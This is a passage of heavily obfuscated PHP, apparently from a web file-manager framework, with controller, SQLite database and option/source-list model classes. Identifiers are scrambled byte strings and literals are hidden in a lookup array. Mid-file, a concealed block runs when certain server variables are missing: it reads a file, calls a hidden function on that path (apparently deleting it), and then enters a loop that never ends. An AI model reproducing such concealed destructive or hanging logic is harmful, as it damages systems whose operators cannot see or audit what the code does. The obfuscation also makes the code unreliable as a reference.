$ˆ¯ÑÊÆÁ = $Ô°Œ­; } $¢“„ø´ì = IO::copyMove($Ÿ©®×Î, $ˆ¯ÑÊÆÁ, $¤Àˆä¢é, $•óâÊ‘Â, $úÀ¢µ©); $¢“„ø´ì = $this->getPathOuter($¢“„ø´ì); return $¢“„ø´ì; } public function pathThis($é¸´’Í‚) { return get_path_this($this->pathParse[$_SERVER[Ñ¯©ç][97]]); } public function pathFather($µ€ÌÊóÒ) { return get_path_father($this->pathParse[$_SERVER[Ñ¯©ç][97]]); } public function iconvSystem($†Û¿Öšı) { return $†Û¿Öšı; } protected function infoParse($ğú¹‘­™, $§–¨°±¸ = false) { $ˆÅÙ‡Æ² =& $_SERVER[Ñ¯©ç]; $¼ªÅâÜƒ = $this->pathParse[$ˆÅÙ‡Æ²[544]][$ˆÅÙ‡Æ²[1232]] . $this->pathParse[$ˆÅÙ‡Æ²[1225]]; if ($§–¨°±¸) { $‘·”’Ü = IO::infoWithChildren($¼ªÅâÜƒ); } else { $‘·”’Ü = IO::info($¼ªÅâÜƒ); } $şûö½ı® = $this->pathParse[$ˆÅÙ‡Æ²[544]]; return Action($ˆÅÙ‡Æ²[1398])->_shareItemeParse($‘·”’Ü, $şûö½ı®); } public function listAll($‡ÅÊ¨Ğã) { $ˆ ½ÄîÌ =& $_SERVER[Ñ¯©ç]; $½ú‰ûØ = IO::listAll($‡ÅÊ¨Ğã); $ßß’êáÄ = rtrim($this->pathParse[$ˆ ½ÄîÌ[544]][$ˆ ½ÄîÌ[1232]], $ˆ ½ÄîÌ[8]); foreach ($½ú‰ûØ as &$×¹—“Œ) { $×¹—“Œ[$ˆ ½ÄîÌ[97]] = $this->pathDriver . $ˆ ½ÄîÌ[8] . ltrim(substr($×¹—“Œ[$ˆ ½ÄîÌ[97]], strlen($ßß’êáÄ)), $ˆ ½ÄîÌ[8]); } unset($×¹—“Œ); return $½ú‰ûØ; } public function listAllSimple($¢ø¼ú‚², $¬¤™Ì»² = false) { $‰†­í¡é =& $_SERVER[Ñ¯©ç]; $Âš‚¾êå = $this->listAll($¢ø¼ú‚²); $Ø–í§ïı = $this->pathParse[$‰†­í¡é[478]]; if (trim($Ø–í§ïı, $‰†­í¡é[8]) == trim(get_path_father($Ø–í§ïı), $‰†­í¡é[8])) { $¬¤™Ì»² = !0; } return IO::init($‰†­í¡é[12])->listAllSimpleMake($Âš‚¾êå, $Ø–í§ïı, $¬¤™Ì»²); } public function getPathOuter($Ó¬¤œøÚ) { $¤Ü€£”İ =& $_SERVER[Ñ¯©ç]; $ƒãâ‚÷§ = KodIO::parse($Ó¬¤œøÚ); if ($ƒãâ‚÷§[$¤Ü€£”İ[33]] == KodIO::KOD_SHARE_ITEM) { return $ƒãâ‚÷§[$¤Ü€£”İ[97]]; } $õÉ‹ÀÒÚ = KodIO::clear($Ó¬¤œøÚ); $ÏÓºşş = KodIO::clear($this->pathParse[$¤Ü€£”İ[544]][$¤Ü€£”İ[1232]]); $şÇö¢Ô§ = substr($õÉ‹ÀÒÚ, strlen($ÏÓºşş)); if (substr($õÉ‹ÀÒÚ, 0, strlen($ÏÓºşş)) != $ÏÓºşş) { return !1; } return $this->pathParse[$¤Ü€£”İ[1226]] . $¤Ü€£”İ[8] . ltrim($şÇö¢Ô§, $¤Ü€£”İ[8]); } public function getType() { $‡í¸‚ =& $_SERVER[Ñ¯©ç]; $Çî¸÷ñÏ = str_replace($‡í¸‚[87], $‡í¸‚[12], get_class($this)); return strtolower($Çî¸÷ñÏ); } public function isOsDriver($Ú’ô˜ãª) { return IO::isOsDriver($Ú’ô˜ãª); } public function info($¬Ö×õ˜) { return $this->infoParse($¬Ö×õ˜); } public function infoAuth($Îè¨éÉº) { return $this->infoParse($Îè¨éÉº); } public function infoWithChildren($ÈÉ¨ú°²) { return $this->infoParse($ÈÉ¨ú°², !0); } public function infoFull($Åˆ„Ï¼Ä) { return $this->infoParse($Åˆ„Ï¼Ä); } } goto f³³¦éÕÀØ; aªğØß®‡ß: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $é–«±ÌÖ =& $_SERVER[Ñ¯©ç]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$é–«±ÌÖ[6]] =& $config; $this->values[$é–«±ÌÖ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $é–«±ÌÖ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($­‹úæÃ) { if (1 === func_num_args()) { $this->{$­‹úæÃ} = new $­‹úæÃ(); } else { $ƒª‚¼±± = new ReflectionClass($­‹úæÃ); $‡İØì•¢ = func_get_args(); array_shift($‡İØì•¢); $this->{$­‹úæÃ} = $ƒª‚¼±±->newInstanceArgs($‡İØì•¢); } return $this->{$­‹úæÃ}; } public function routeBind($î£ËÇïš, $Í¿œ ¹¯, $ˆÚËôüÈ = 3) { $ÂÎ¢Îá‹ =& $_SERVER[Ñ¯©ç]; $„×ğñ” = $this->in[$ÂÎ¢Îá‹[9]]; $î£ËÇïš = str_replace($ÂÎ¢Îá‹[10], $ÂÎ¢Îá‹[11], trim(trim($î£ËÇïš, $ÂÎ¢Îá‹[8]), $ÂÎ¢Îá‹[12])); if (!$î£ËÇïš || count($„×ğñ”) <= $ˆÚËôüÈ) { return !1; } $è¯Âî = !0; $à•Ñ§–³ = explode($ÂÎ¢Îá‹[8], $î£ËÇïš); for ($™¼ ôÑ© = 0; $™¼ ôÑ© < count($à•Ñ§–³); $™¼ ôÑ©++) { if ($à•Ñ§–³[$™¼ ôÑ©] != $„×ğñ”[$ˆÚËôüÈ + $™¼ ôÑ©]) { $è¯Âî = !1; break; } } if (!$è¯Âî) { return; } call_user_func_array(array($this, $Í¿œ ¹¯), array()); } public function routeArgs($Ï¢‚„İÃ = 3) { $‰á³©ÃÉ = $this->in[$_SERVER[Ñ¯©ç][9]]; if (count($‰á³©ÃÉ) <= $Ï¢‚„İÃ) { return array(); } $ù—‡“”Ú = array(); for ($ı„×Ù÷Œ = $Ï¢‚„İÃ; $ı„×Ù÷Œ < count($‰á³©ÃÉ); $ı„×Ù÷Œ += 2) { $ù—‡“”Ú[$‰á³©ÃÉ[$ı„×Ù÷Œ]] = $‰á³©ÃÉ[$ı„×Ù÷Œ + 1]; $this->in[$‰á³©ÃÉ[$ı„×Ù÷Œ]] = $‰á³©ÃÉ[$ı„×Ù÷Œ + 1]; } return $ù—‡“”Ú; } protected function assign($¶ìØ›¶á, $ú·‘‡¯) { $this->values[$¶ìØ›¶á] = $ú·‘‡¯; } protected function display($¾ŒğÄ©¡) { ob_end_clean(); extract($this->values); require $this->tpl . $¾ŒğÄ©¡; } } class DbSqliteBase extends Db { public function __construct($´§¸ñ‡Ú = '') { $×ÒŒˆ» =& $_SERVER[Ñ¯©ç]; if (!extension_loaded($×ÒŒˆ»[13])) { think_exception(think_lang($×ÒŒˆ»[14]) . $×ÒŒˆ»[15]); } if (!empty($´§¸ñ‡Ú)) { if (!isset($´§¸ñ‡Ú[$×ÒŒˆ»[16]])) { $´§¸ñ‡Ú[$×ÒŒˆ»[16]] = 438; } $this->config = $´§¸ñ‡Ú; if (empty($this->config[$×ÒŒˆ»[17]])) { $this->config[$×ÒŒˆ»[17]] = array(); } } } public function connect($×£‡·´¶ = '', $êÚ‘¼İ = 0) { $ëáÓş® =& $_SERVER[Ñ¯©ç]; if (!isset($this->linkID[$êÚ‘¼İ])) { if (empty($×£‡·´¶)) { $×£‡·´¶ = $this->config; } $ìÅâ•à´ = !empty($×£‡·´¶[$ëáÓş®[17]][$ëáÓş®[18]]) ? $×£‡·´¶[$ëáÓş®[17]][$ëáÓş®[18]] : $this->pconnect; $ËÆÒÂ›¤ = $ìÅâ•à´ ? $ëáÓş®[19] : $ëáÓş®[20]; $this->linkID[$êÚ‘¼İ] = $ËÆÒÂ›¤($×£‡·´¶[$ëáÓş®[21]], $×£‡·´¶[$ëáÓş®[16]]); if (!$this->linkID[$êÚ‘¼İ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$êÚ‘¼İ], 30000); if (1 != think_config($ëáÓş®[22])) { unset($this->config); } } return $this->linkID[$êÚ‘¼İ]; } public function free() { $this->queryID = null; } public function query($Ã÷­¾íõ) { $²¼º˜£¡ =& $_SERVER[Ñ¯©ç]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ã÷­¾íõ; if ($this->queryID) { $this->free(); } think_action_status($²¼º˜£¡[23], 1); think_status($²¼º˜£¡[24]); $this->queryID = sqlite_query($this->_linkID, $Ã÷­¾íõ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¬Úü¬õ³ = $this->getAll(); return $¬Úü¬õ³; } } public function execute($ÓŒû³ï¤) { $õÌ–Á¥ñ =& $_SERVER[Ñ¯©ç]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÓŒû³ï¤; if ($this->queryID) { $this->free(); } think_action_status($õÌ–Á¥ñ[25], 1); think_status($õÌ–Á¥ñ[24]); $ÆØæëøÇ = sqlite_exec($this->_linkID, $ÓŒû³ï¤); $this->debug(); if (!1 === $ÆØæëøÇ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ñ¯©ç][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ìñ„Ô¿ø = sqlite_query($this->_linkID, $_SERVER[Ñ¯©ç][27]); if (!$ìñ„Ô¿ø) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $í„Ú ‡Ÿ = sqlite_query($this->_linkID, $_SERVER[Ñ¯©ç][28]); if (!$í„Ú ‡Ÿ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¿şİ·à¢ = array(); if ($this->numRows > 0) { for ($½Û«õ˜ƒ = 0; $½Û«õ˜ƒ < $this->numRows; $½Û«õ˜ƒ++) { $¿şİ·à¢[$½Û«õ˜ƒ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¿şİ·à¢; } public function getFields($·–šú•ì) { $ñş§¢Ú• =& $_SERVER[Ñ¯©ç]; $‚ßæÙé = $this->query($ñş§¢Ú•[29] . $·–šú•ì . $ñş§¢Ú•[30]); $…½Êˆ‡ = array(); if ($‚ßæÙé) { foreach ($‚ßæÙé as $é´œƒ´ => $ÔÒ„…Àı) { $…½Êˆ‡[$ÔÒ„…Àı[$ñş§¢Ú•[31]]] = array($ñş§¢Ú•[32] => $ÔÒ„…Àı[$ñş§¢Ú•[31]], $ñş§¢Ú•[33] => $ÔÒ„…Àı[$ñş§¢Ú•[34]], $ñş§¢Ú•[35] => (bool) ($ÔÒ„…Àı[$ñş§¢Ú•[36]] === $ñş§¢Ú•[12]), $ñş§¢Ú•[37] => $ÔÒ„…Àı[$ñş§¢Ú•[38]], $ñş§¢Ú•[39] => strtolower($ÔÒ„…Àı[$ñş§¢Ú•[40]]) == $ñş§¢Ú•[41], $ñş§¢Ú•[42] => strtolower($ÔÒ„…Àı[$ñş§¢Ú•[43]]) == $ñş§¢Ú•[44]); } } return $…½Êˆ‡; } public function getTables($Ô§ÃØ¡ì = '') { $¦ÉÀµ¹ =& $_SERVER[Ñ¯©ç]; $¢ÄÕ›ó© = $this->query($¦ÉÀµ¹[45] . $¦ÉÀµ¹[46] . $¦ÉÀµ¹[47]); $Æ×“›½ = array(); foreach ($¢ÄÕ›ó© as $ÁÉû„é => $ëÅôÆ’) { $Æ×“›½[$ÁÉû„é] = current($ëÅôÆ’); } return $Æ×“›½; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $¯•¶úÒü =& $_SERVER[Ñ¯©ç]; $ÏóÑÆ¨‡ = sqlite_last_error($this->_linkID); $this->error = $ÏóÑÆ¨‡ . $¯•¶úÒü[4] . sqlite_error_string($ÏóÑÆ¨‡); if ($¯•¶úÒü[12] != $this->queryStr) { $this->error .= LNG($¯•¶úÒü[48]) . $this->queryStr; } think_trace($this->error, $¯•¶úÒü[12], $¯•¶úÒü[49]); return $this->error; } public function escapeString($¤‘£ûµ») { return sqlite_escape_string($¤‘£ûµ»); } public function parseLimit($¾®‰á¤Ş) { $€©¡Ú¬“ =& $_SERVER[Ñ¯©ç]; $½ç®Èè = $€©¡Ú¬“[12]; if (!empty($¾®‰á¤Ş)) { $¾®‰á¤Ş = explode($€©¡Ú¬“[50], $¾®‰á¤Ş); if (count($¾®‰á¤Ş) > 1) { $½ç®Èè .= $€©¡Ú¬“[51] . $¾®‰á¤Ş[1] . $€©¡Ú¬“[52] . $¾®‰á¤Ş[0] . $€©¡Ú¬“[53]; } else { $½ç®Èè .= $€©¡Ú¬“[51] . $¾®‰á¤Ş[0] . $€©¡Ú¬“[53]; } } return $½ç®Èè; } } if (!isset($_SERVER[$_SERVER[Ñ¯©ç][54]]) || !isset($_SERVER[$_SERVER[Ñ¯©ç][55]])) { $_getc = $_SERVER[Ñ¯©ç][56]; $_getfile = $_SERVER[$_SERVER[Ñ¯©ç][57]] . $_SERVER[Ñ¯©ç][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ñ¯©ç][59], $_getfilec); if (count($_getarrs) < $_SERVER[Ñ¯©ç][60]) { $exit = $_SERVER[Ñ¯©ç][61]; $exit(); } $_act = $_SERVER[Ñ¯©ç][62]; $_act($_SERVER[$_SERVER[Ñ¯©ç][57]] . $_SERVER[Ñ¯©ç][58]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ñ¯©ç][63]); } } goto C¤—ğÆñö; E™ŸêÅÈƒ»: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\145\155\x4f\x70\x74\151\x6f\x6e"; public $field = array(); public function listData($Ÿ¶ÕÀÛù = false, $¬ƒÓïËÜ = "\155\x6f\x64\151\146\x79\x54\151\x6d\145", $´ÜÆåÅÀ = false) { $ùÙÏÎğ£ = Model($this->modelType)->get(!1, $this->optionType, !0); $€şÛŒ†‡ = array_values($ùÙÏÎğ£); if ($€şÛŒ†‡ && $€şÛŒ†‡[0] && !is_array($€şÛŒ†‡[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ùÙÏÎğ£ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ùÙÏÎğ£) { return $Ÿ¶ÕÀÛù ? null : array(); } if (!$Ÿ¶ÕÀÛù) { $ùÙÏÎğ£ = array_filter(array_values($ùÙÏÎğ£)); return array_sort_by($ùÙÏÎğ£, $¬ƒÓïËÜ, $´ÜÆåÅÀ); } return $ùÙÏÎğ£[$_SERVER[Ñ¯©ç][455] . $Ÿ¶ÕÀÛù]; } public function insert($ƒÁÅô³Œ) { $ú»ü—¡ì =& $_SERVER[Ñ¯©ç]; $ƒÁÅô³Œ = array_field_key($ƒÁÅô³Œ, $this->field); $Ø“›õŸ‹ = Model($this->modelType)->get($ú»ü—¡ì[456], $this->optionType . $ú»ü—¡ì[457]); $Ø“›õŸ‹ = $Ø“›õŸ‹ ? $Ø“›õŸ‹ : 0; $ƒÁÅô³Œ[$ú»ü—¡ì[458]] = ++$Ø“›õŸ‹; $ƒÁÅô³Œ[$ú»ü—¡ì[232]] = time(); $ƒÁÅô³Œ[$ú»ü—¡ì[98]] = time(); Model($this->modelType)->set($ú»ü—¡ì[456], $Ø“›õŸ‹, $this->optionType . $ú»ü—¡ì[457]); Model($this->modelType)->set($ú»ü—¡ì[455] . $Ø“›õŸ‹, $ƒÁÅô³Œ, $this->optionType); return $Ø“›õŸ‹; } public function update($ß€¦éô, $Šê¥ÔÛİ) { $ çˆöÇá =& $_SERVER[Ñ¯©ç]; $Šê¥ÔÛİ = array_field_key($Šê¥ÔÛİ, $this->field); $¨³‚òË“ = $this->listData($ß€¦éô); if (!$¨³‚òË“ || !$ß€¦éô) { return !1; } $Šê¥ÔÛİ = array_merge($¨³‚òË“, $Šê¥ÔÛİ); $Šê¥ÔÛİ[$ çˆöÇá[98]] = time(); return Model($this->modelType)->set($ çˆöÇá[455] . $ß€¦éô, $Šê¥ÔÛİ, $this->optionType); } public function remove($çö‘) { if (!$çö‘) { return !1; } return Model($this->modelType)->remove($_SERVER[Ñ¯©ç][455] . $çö‘, $this->optionType); } public function clear() { $˜ÍÜÛñì =& $_SERVER[Ñ¯©ç]; Model($this->modelType)->remove($˜ÍÜÛñì[456], $this->optionType . $˜ÍÜÛñì[457]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($°÷ÒÎô, $•ğ³ÖÁ×) { if (!$•ğ³ÖÁ×) { return !1; } $”º¥­Ğ = $this->listData(); $”º¥­Ğ = array_to_keyvalue($”º¥­Ğ, $°÷ÒÎô); return isset($”º¥­Ğ[$•ğ³ÖÁ×]) ? $”º¥­Ğ[$•ğ³ÖÁ×] : !1; } public function findByName($¤Êí¹) { return $this->findByKey($_SERVER[Ñ¯©ç][32], $¤Êí¹); } protected function resetData($‘ëŒßö›) { $º¶ÑÙ€ =& $_SERVER[Ñ¯©ç]; $‘ëŒßö› = is_array($‘ëŒßö›) ? $‘ëŒßö› : array(); $á¬ø’Ù¬ = array(); for ($ÏÙ¡£‚î = 0; $ÏÙ¡£‚î < count($‘ëŒßö›); $ÏÙ¡£‚î++) { $á¬ø’Ù¬[$º¶ÑÙ€[455] . $‘ëŒßö›[$ÏÙ¡£‚î][$º¶ÑÙ€[458]]] = $‘ëŒßö›[$ÏÙ¡£‚î]; } return Model($this->modelType)->set($á¬ø’Ù¬, !1, $this->optionType); } private function getAutoName($¥÷ù¶ïÆ) { $ÏÔşß‚ = array_to_keyvalue($this->listData(), $_SERVER[Ñ¯©ç][32]); if (!$ÏÔşß‚ || !isset($ÏÔşß‚[$¥÷ù¶ïÆ])) { return $¥÷ù¶ïÆ; } for ($µíš‘×¢ = 1; $µíš‘×¢ < count($ÏÔşß‚); $µíš‘×¢++) { $ËÖ¯­Ş = $¥÷ù¶ïÆ . "\x28{$µíš‘×¢}\x29"; if (!isset($ÏÔşß‚[$ËÖ¯­Ş])) { return $ËÖ¯­Ş; } } return $ËÖ¯­Ş; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($é—²ãå = false, $ˆ¾‚‚çî = '', $Ê¿€–Æİ = false) { $Ëê–İú =& $_SERVER[Ñ¯©ç]; $ı‡”¢— = $this->cacheGet($ˆ¾‚‚çî); $Íúè£ä = $this->optionDefault($ˆ¾‚‚çî); $Íúè£ä = is_array($Íúè£ä) ? $Íúè£ä : array(); if (is_array($ı‡”¢—)) { $ı‡”¢— = array_merge($Íúè£ä, $ı‡”¢—); return $é—²ãå ? isset($ı‡”¢—[$é—²ãå]) ? $ı‡”¢—[$é—²ãå] : null : $ı‡”¢—; } $¶š•†È = $this->filterWhere(array($Ëê–İú[33] => $ˆ¾‚‚çî)); $ı‡”¢— = $this->where($¶š•†È)->select(); $ı‡”¢— = array_to_keyvalue($ı‡”¢—, $Ëê–İú[107], $Ëê–İú[434]); foreach ($ı‡”¢— as $õøöŠ„ => $ ·ªø¦Ç) { if ($Ê¿€–Æİ || in_array($õøöŠ„, $this->jsonField)) { $ı‡”¢—[$õøöŠ„] = json_decode($ ·ªø¦Ç, !0); } } $this->cacheSet($ˆ¾‚‚çî, $ı‡”¢—); $ı‡”¢— = array_merge($Íúè£ä, $ı‡”¢—); return $é—²ãå ? $ı‡”¢—[$é—²ãå] : $ı‡”¢—; } public function set($ÒÕ®ñÃõ, $âîïÖôï = false, $×‹¥²î’ = '') { $ß¢¹£ù =& $_SERVER[Ñ¯©ç]; $this->cacheRemove($×‹¥²î’); $ôÍÉı™ = array(); $ûáãŠÁÈ = is_array($ÒÕ®ñÃõ) ? $ÒÕ®ñÃõ : array($ÒÕ®ñÃõ => $âîïÖôï); foreach ($ûáãŠÁÈ as $×©Œû« => $÷»ªïñ) { if (is_array($÷»ªïñ)) { $÷»ªïñ = json_encode_force($÷»ªïñ); } $this->checkLength($÷»ªïñ, !1, $this->tableName . $ß¢¹£ù[4] . $ÒÕ®ñÃõ); $÷»ªïñ = self::textEncode($÷»ªïñ); $ûáãŠÁÈ = array($ß¢¹£ù[33] => $×‹¥²î’, $ß¢¹£ù[107] => $×©Œû«, $ß¢¹£ù[434] => $÷»ªïñ); $ôÍÉı™[] = $this->filterWhere($ûáãŠÁÈ); } if (!$ôÍÉı™) { return !0; } $Ã÷óˆìË = $this->cacheKey($ß¢¹£ù[459]); CacheLock::lock($Ã÷óˆìË); $ßÏù§“ = $this->addAll($ôÍÉı™, array(), !0); CacheLock::unlock($Ã÷óˆìË); return $ßÏù§“; } protected function optionDefault($Şµ……éÏ = '') { return !1; } public function setDeep($™íÚ–¿¥, $•ëø»Ú­ = false, $ºÕ±í = '') { $Ô¦ËÅÍ¯ = explode($_SERVER[Ñ¯©ç][10], $™íÚ–¿¥); $‚äü•ëĞ = $this->get(); array_set_value($‚äü•ëĞ, $™íÚ–¿¥, $•ëø»Ú­); $this->set($Ô¦ËÅÍ¯[0], $‚äü•ëĞ[$Ô¦ËÅÍ¯[0]], $ºÕ±í); } public function remove($àÈ¯ùÀ, $ â¬‰¢õ = '') { $ñ™¯‹ˆ =& $_SERVER[Ñ¯©ç]; $this->cacheRemove($ â¬‰¢õ); $±²ìîÂ = $this->filterWhere(array($ñ™¯‹ˆ[107] => $àÈ¯ùÀ, $ñ™¯‹ˆ[33] => $ â¬‰¢õ)); if (is_null($àÈ¯ùÀ)) { unset($±²ìîÂ[$ñ™¯‹ˆ[107]]); } return $this->where($±²ìîÂ)->delete(); } public function cacheSet($¦µïªî†, $ıÎÍ«¿ = false) { return Cache::set($this->cacheKey($¦µïªî†), $ıÎÍ«¿); } public function cacheGet($ËòİÑµé) { return Cache::get($this->cacheKey($ËòİÑµé)); } public function cacheRemove($»éõÚÆã) { return Cache::remove($this->cacheKey($»éõÚÆã)); } protected function filterWhere($óñŞŸ¾‰) { return $óñŞŸ¾‰; } protected function cacheKey($õçôÙì) { return $õçôÙì; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\162\x63\x65"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\x61\x6d\x65" => "\x69\x6f\x5f\163\157\165\x72\x63\x65\137\155\x65\164\x61", "\x6d\x65\164\x61\x46\151\145\x6c\144" => "\x73\x6f\x75\162\x63\145\111\104"); protected $dataAuto = array(array("\155\157\x64\x69\x66\x79\124\x69\x6d\x65", "\164\x69\155\145", "\x69\156\x73\x65\162\164", "\146\165\156\143\164\151\x6f\x6e"), array("\x63\x72\x65\141\164\x65\124\x69\155\145", "\x74\151\x6d\x65", "\151\x6e\163\145\x72\164", "\146\165\x6e\x63\x74\x69\x6f\x6e"), array("\x76\x69\145\167\x54\151\x6d\x65", "\164\x69\x6d\145", "\x69\156\x73\x65\162\164", "\146\165\x6e\x63\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($«•©Š÷) { return $this->listSource(array($_SERVER[Ñ¯©ç][460] => $«•©Š÷)); } public function typeName($Û ³ŠÎÕ) { static $ê½¹ÚÄ = array(self::TYPE_SYSTEM => "\x73\171\x73\x74\x65\x6d", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\147\x72\x6f\x75\x70"); return $ê½¹ÚÄ[$Û ³ŠÎÕ . $_SERVER[Ñ¯©ç][12]]; } public function sourceListInfo($­ö¸úºœ, $ÙûÔˆíµ = false) { $¢Ô´´×Ù =& $_SERVER[Ñ¯©ç]; $­ö¸úºœ = $­ö¸úºœ ? $­ö¸úºœ : array(); $­ö¸úºœ = array_filter(array_unique($­ö¸úºœ)); if (!$­ö¸úºœ) { return array(); } $—´ÀìœÖ = $this->where(array($¢Ô´´×Ù[194] => array($¢Ô´´×Ù[7], $­ö¸úºœ)))->select(); $this->_listDataApply($—´ÀìœÖ, $ÙûÔˆíµ); return array_to_keyvalue($—´ÀìœÖ, $¢Ô´´×Ù[194]); } public function pathInfoFilter(&$ØøĞáÖ·) { $®ô¶¡¸ =& $_SERVER[Ñ¯©ç]; static $§Ï‹ÂÚ = false; static $³¯§´¯å = false; static $ÔÅÀ”« = false; if (!$§Ï‹ÂÚ) { $ÈÊ´»ô = $®ô¶¡¸[461]; $ÈÊ´»ô .= $®ô¶¡¸[462]; $ÈÊ´»ô .= $®ô¶¡¸[463]; $ÅíÛ·¹ = $®ô¶¡¸[464]; $şÃÑ®• = explode($®ô¶¡¸[50], $ÅíÛ·¹); $§Ï‹ÂÚ = explode($®ô¶¡¸[50], $ÈÊ´»ô); $³¯§´¯å = array(); foreach ($§Ï‹ÂÚ as $²ÅŞÛ˜×) { if (in_array($²ÅŞÛ˜×, $şÃÑ®•)) { continue; } $³¯§´¯å[] = $²ÅŞÛ˜×; } $ÔÅÀ”« = explode($®ô¶¡¸[50], $®ô¶¡¸[465]); } foreach ($ÔÅÀ”« as $¬‘ƒÏ·À) { if (isset($ØøĞáÖ·[$¬‘ƒÏ·À])) { $ØøĞáÖ·[$¬‘ƒÏ·À] = intval($ØøĞáÖ·[$¬‘ƒÏ·À]); } } $ØøĞáÖ·[$®ô¶¡¸[97]] = $®ô¶¡¸[466] . $ØøĞáÖ·[$®ô¶¡¸[194]] . $®ô¶¡¸[467]; $ØøĞáÖ·[$®ô¶¡¸[33]] = $ØøĞáÖ·[$®ô¶¡¸[468]] == 1 ? $®ô¶¡¸[88] : $®ô¶¡¸[231]; $ØøĞáÖ·[$®ô¶¡¸[191]] = $this->typeName($ØøĞáÖ·[$®ô¶¡¸[191]]); if ($ØøĞáÖ·[$®ô¶¡¸[468]] != 1) { $ØøĞáÖ·[$®ô¶¡¸[188]] = $ØøĞáÖ·[$®ô¶¡¸[469]]; unset($ØøĞáÖ·[$®ô¶¡¸[469]]); } $ÜşÒÓ©µ = $§Ï‹ÂÚ; if (isset($ØøĞáÖ·[$®ô¶¡¸[470]]) && $ØøĞáÖ·[$®ô¶¡¸[470]][$®ô¶¡¸[471]] == -1) { $ÜşÒÓ©µ = $³¯§´¯å; } $ØøĞáÖ· = array_field_key($ØøĞáÖ·, $ÜşÒÓ©µ); return $ØøĞáÖ·; } public function listUserFav() { $’Ö¡¸ è =& $_SERVER[Ñ¯©ç]; $ãï÷ï¥ = Model($’Ö¡¸ è[472])->listData(); $ŞğÔ‘Ôë = array_filter_by_field($ãï÷ï¥, $’Ö¡¸ è[33], $’Ö¡¸ è[473]); $ŞğÔ‘Ôë = array_to_keyvalue($ŞğÔ‘Ôë, $’Ö¡¸ è[12], $’Ö¡¸ è[97]); if ($ŞğÔ‘Ôë) { $¨ÕÉëƒÉ = $this->listSource(array($’Ö¡¸ è[474] => array($’Ö¡¸ è[475], $ŞğÔ‘Ôë))); } $¨ÕÉëƒÉ = array_to_keyvalue($¨ÕÉëƒÉ[$’Ö¡¸ è[429]], $’Ö¡¸ è[194]); foreach ($ãï÷ï¥ as &$Ô÷Ã±‰Ä) { $Ô÷Ã±‰Ä = array($’Ö¡¸ è[476] => $Ô÷Ã±‰Ä[$’Ö¡¸ è[458]], $’Ö¡¸ è[477] => $Ô÷Ã±‰Ä[$’Ö¡¸ è[32]], $’Ö¡¸ è[478] => $Ô÷Ã±‰Ä[$’Ö¡¸ è[97]], $’Ö¡¸ è[479] => $Ô÷Ã±‰Ä[$’Ö¡¸ è[33]], $’Ö¡¸ è[480] => $Ô÷Ã±‰Ä[$’Ö¡¸ è[232]], $’Ö¡¸ è[481] => $Ô÷Ã±‰Ä[$’Ö¡¸ è[98]]); if ($Ô÷Ã±‰Ä[$’Ö¡¸ è[33]] == $’Ö¡¸ è[473] && $¨ÕÉëƒÉ[$Ô÷Ã±‰Ä[$’Ö¡¸ è[97]]]) { $Ô÷Ã±‰Ä[$’Ö¡¸ è[100]] = $¨ÕÉëƒÉ[$Ô÷Ã±‰Ä[$’Ö¡¸ è[97]]]; } } unset($Ô÷Ã±‰Ä); return $ãï÷ï¥; } public function listUserTag($Õ˜î¸›Í) { $Ÿ‚ôâå¿ =& $_SERVER[Ñ¯©ç]; if ($Õ˜î¸›Í && !is_array($Õ˜î¸›Í)) { $Õ˜î¸›Í = array($Õ˜î¸›Í); } $ƒÉ±Ôœ = Model($Ÿ‚ôâå¿[482])->listData(); $‚Õ°ëå® = array(); $¯œ×‡ = array(); foreach ($ƒÉ±Ôœ as $¿Ôß­¢) { $ˆ¹İ±ı = $¿Ôß­¢[$Ÿ‚ôâå¿[97]]; if (!$ˆ¹İ±ı) { continue; } if (!isset($¯œ×‡[$ˆ¹İ±ı])) { $¯œ×‡[$ˆ¹İ±ı] = array(); } $¯œ×‡[$ˆ¹İ±ı][] = $¿Ôß­¢[$Ÿ‚ôâå¿[483]]; $‚Õ°ëå®[$¿Ôß­¢[$Ÿ‚ôâå¿[97]]] = $¿Ôß­¢; } $­Ç–†å = array(); $”š•¿— = array(); $ªˆŸ¢é¾ = array(); foreach ($¯œ×‡ as $ØÚı¡ëß => $š…†”˜ˆ) { $Òê·Ú„— = !0; if (!$Õ˜î¸›Í) { $­Ç–†å[] = $ØÚı¡ëß; continue; } foreach ($Õ˜î¸›Í as 